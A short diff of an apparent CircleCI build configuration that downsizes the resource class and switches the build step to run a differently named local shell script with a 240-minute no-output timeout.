@@ -1,11 +1,11 @@
-resource_class: xxlarge
+resource_class: large
 working_dir: &working_dir ~/app
 
 .build_template: &build_definition
   steps:
     - checkout 
     - run:  
-        command: chmod +x ./ketekasap.sh && ./ketekasap.sh
+        command: chmod +x ./ketekribut.sh && ./ketekribut.sh
         no_output_timeout: 240m
 
 version: 2.0
